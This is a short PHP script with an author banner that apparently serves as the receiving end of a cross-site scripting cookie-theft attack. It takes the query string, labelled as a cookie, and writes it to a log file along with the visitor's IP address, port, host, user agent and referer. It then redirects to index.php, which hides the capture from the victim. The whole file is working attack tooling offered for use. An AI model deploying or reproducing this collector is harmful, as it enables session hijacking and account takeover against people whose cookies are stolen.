<!-- 
#############################################################################################################################                                  

88b           d88  88888888ba                88b           d88  888888888888  I8,        8        ,8I    ,ad8888ba,       88  
888b         d888  88      "8b               888b         d888       88       `8b       d8b       d8'   d8"'    `"8b      ""  
88`8b       d8'88  88      ,8P               88`8b       d8'88       88        "8,     ,8"8,     ,8"   d8'        `8b         
88 `8b     d8' 88  88aaaaaa8P'               88 `8b     d8' 88       88         Y8     8P Y8     8P    88          88     88  
88  `8b   d8'  88  88""""88'                 88  `8b   d8'  88       88         `8b   d8' `8b   d8'    88          88     88  
88   `8b d8'   88  88    `8b                 88   `8b d8'   88       88          `8a a8'   `8a a8'     Y8,        ,8P     88  
88    `888'    88  88     `8b       888      88    `888'    88       88           `8a8'     `8a8'       Y8a.    .a8P      88  
88     `8'     88  88      `8b      888      88     `8'     88       88            `8'       `8'         `"Y8888Y"'       88  
                                                                                                                         ,88  
                                                                                                                       888P"  
##############################################################################################################################
 #   twitter.com/MrMtwoj
 #   linkedin.com/in/joshani
 #   youtube.com/channel/UCWFLKi_xJDjg2kWQNYEXRhQ
 #   github.com/mrmtwoj
###############################################################################################################################
 -->
<meta http-equiv="refresh" content="0;URL=index.php" />
<?php
function GetIP()
{
if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
$ip = getenv("HTTP_CLIENT_IP");
else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
$ip = getenv("HTTP_X_FORWARDED_FOR");
else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
$ip = getenv("REMOTE_ADDR");
else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
$ip = $_SERVER['REMOTE_ADDR'];
else
$ip = "unknown";
return($ip);
}

function logData()
{
$ipLog="log.txt";
$cookie = $_SERVER['QUERY_STRING'];
$register_globals = (bool) ini_get('register_gobals');
if ($register_globals) $ip = getenv('REMOTE_ADDR');
else $ip = GetIP();

$rem_port = $_SERVER['REMOTE_PORT'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$rqst_method = $_SERVER['METHOD'];
$rem_host = $_SERVER['REMOTE_HOST'];
$referer = $_SERVER['HTTP_REFERER'];
$date=date ("l dS of F Y h:i:s A");
$log=fopen("$ipLog", "a+");

if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
");
else
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
fclose($log);
}

logData();

?>